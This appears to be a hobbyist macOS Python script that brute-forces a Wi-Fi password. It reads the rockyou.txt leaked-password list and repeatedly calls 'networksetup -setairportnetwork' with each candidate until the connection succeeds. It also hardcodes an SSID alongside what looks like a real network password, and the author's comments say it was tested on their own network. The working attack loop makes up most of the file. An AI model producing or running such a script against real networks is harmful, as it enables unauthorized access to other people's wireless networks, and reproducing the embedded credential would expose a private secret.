#import argparse # parsing to the command line

#successfully works as of 4/9/22 ~12:30 am
import os
import subprocess
#from time import sleep

bashTest = ""

print("This is the current working directory: ", os.getcwd())
#os.system('touch gooboy')   # works perfectly
#print(dir(os))
#os.system('networksetup -listallhardwareports')

'''
NOTE
os.system('airport -s') # to setup airport on a machine, go to 'https://osxdaily.com/2007/01/18/airport-the-little-known-command-line-wireless-utility/' for guideance

bashTest = str(subprocess.check_output(['airport', '-s']))

print(bashTest)
'''


'''
VLAN Configurations
===================
Supported arguments:
 -c[<arg>] --channel=[<arg>]    Set arbitrary channel on the card
 -z        --disassociate       Disassociate from any network
 -I        --getinfo            Print current wireless status, e.g. signal info, BSSID (requires sudo), port type etc.
 -s[<arg>] --scan=[<arg>]       Perform a wireless broadcast scan.
                                   Will perform a directed scan if the optional <arg> is provided.
                                   BSSID and country code information requires sudo.
 -x        --xml                Print info as XML
 -P        --psk                Create PSK (pre-shared key) from specified pass phrase and SSID.
                                   The following additional arguments must be specified with this command:
                                  --password=<arg>  Specify a WPA password
                                  --ssid=<arg>      Specify SSID when creating a PSK
 -h        --help               Show this help


View available Wi-Fi networks
airport -s

Join Wi-Fi network
networksetup -setairportnetwork en0 SSID_OF_WIRELESS_NETWORK WIRELESS_NETWORK_PASSPHRASE

Create a Wi-Fi network profile
networksetup -addpreferredwirelessnetworkatindex en0 SSID_OF_NETWORK INDEX_NUMBER SECURITY_OF_WIRELESS_NETWORK WIRELESS_NETWORK_PASSPHRASE
 '''
ssid = 'FRVNET1' # "Extell's iPhone XR"
password = "xrpkzg3qzcchf"

#os.system('networksetup -setairportnetwork en0 "{}" {}'.format(ssid, password))
#os.system('networksetup -setairportnetwork en0 BNWiFi NONE')    # Works!

target = ""
unknown = ""

# https://www.delftstack.com/howto/python/python-open-file-in-different-directory/ when using 'pathlib.Path()' Dont use / instead use \
# Volumes/Education/CSCI/Prgm\ Langs/Python/advanced/cross\ program\ tests/crack_databases/rockyou.txt
# sometimes the code wont work because you arent in the right directory fyi

# exploring __file__ use
'''
currentDirectory = __file__ # NOTE this gets the current location of the RUNNING FILE. Extremely useful for when other ppl need to run the program and you need to act on files within the same dir
print(currentDirectory) # works beautifully
'''

database = os.getcwd() + "/crack_databases/rockyou.txt"
print(database)
data = set()
data2 = []
dataLength = 0
lastPassword = ""


with open(database, 'rb') as file:
    try:
        for _ in file:
            # only added this if() to test to see if it would sucessfully use this password to get into my wifi
            '''            
            if (dataLength == 15):
                temp = 'xrpkzg3qzcchf'
                data.add(temp)
                dataLength +=1
                lastPassword = temp
            else:
            '''
            temp = _[:-1]   # gotta remove the stupid \n, apparently if you do -2 you remove the n and the last letter of the string. the escape character --> \ isnt counted in the str
            #print(temp)
            data.add(temp)
            dataLength += 1
            lastPassword = temp
    except:
        print("stopped at {}, with length: {}".format(lastPassword, dataLength))
        print("failed")

# stopgap to make sure everything processed
#print(dataLength)
#sleep(3)


for _ in data:
    temp = _.decode('latin1')
    #data2.add(temp)    # handling data2 as a set...but i cant iterate through a fucking set so i need to either make it an iterator or a list or a dict
    data2.append(temp)

#print("contents of data2:\n\n", data2[0:20])
attempts = 0

''' temp removed at 12:26am 4/10/22
try:
    for current_pass in data2:
        attempts += 1
        print(attempts)
        #os.system('networksetup -setairportnetwork en0 {} "{}"'.format(ssid, current_pass))
        errorSeeking = subprocess.run(['networksetup', '-setairportnetwork', 'en0', '{}'.format(ssid), '{}'.format(current_pass)], stdout = subprocess.PIPE, text = True)
        if ("Error:" in errorSeeking):
            print("'Error:' output detected")
            pass
        else:
            print("Successful connection to network!")
            break
except:
    print("something must have gone wrong in the os.system/subprocess.run() command ie terminal on attempt # {}".format(attempts))
'''

# used to make sure logic worked (still need to weed out hidden bugs)
#artificalDatabase = ["liverpool", "secret", "11prV1091rqT", "sierra", "1111111"]

for current_pass in data2:
    attempts += 1
    print("attempt number: ", attempts)
    print("password we are about to try: ", current_pass)
    #os.system('networksetup -setairportnetwork en0 {} "{}"'.format(ssid, current_pass))
    errorSeeking = subprocess.run(['networksetup', '-setairportnetwork', 'en0', '{}'.format(ssid), '{}'.format(current_pass)], stdout = subprocess.PIPE, text = True)

    es_String = str(errorSeeking)
    print("SUBPROCESS RESULTS\n", es_String)

    # do note that this will terminate with Success if the computer enters sleep mode.
    if ("Error:" in es_String):
        print("'Error:' output detected")
        pass
    else:
        print("Successful connection to network!")
        break

#os.system('networksetup -setairportnetwork en0 {} "{}"'.format(target, unknown))    # Works!


#os.system('moo1moo1gas')  # you can add the password response like this